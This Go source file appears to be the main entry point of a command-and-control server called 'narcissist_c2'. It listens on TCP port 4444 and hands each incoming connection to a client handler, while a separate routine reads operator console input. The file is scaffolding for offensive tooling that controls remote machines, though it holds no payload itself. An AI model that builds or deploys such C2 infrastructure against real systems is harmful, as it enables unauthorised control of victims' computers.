package main

import (
	"fmt"
	"narcissist_c2/server/components"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"net"
	"sync"
)

var mutex sync.Mutex

func main() {

	// INIT LISTENER ==========================================
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println(utils.GetEmoji("listenning") + "Listening on :4444")
	// =======================================================

	// MANAGE C2 CONSOLE ========================================

	inputChannels := structs.Channels{
		ServerIptCh: make(chan bool),
		ClientIptCh: make(chan bool),
	}

	go components.HandleInput()
	//inputChannels.ClientIptCh <- false
	// =======================================================

	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println(utils.GetEmoji("error")+"Error accepting connection:", err)
			panic(err)

		}

		go components.HandleClient(conn, inputChannels)

	}

}
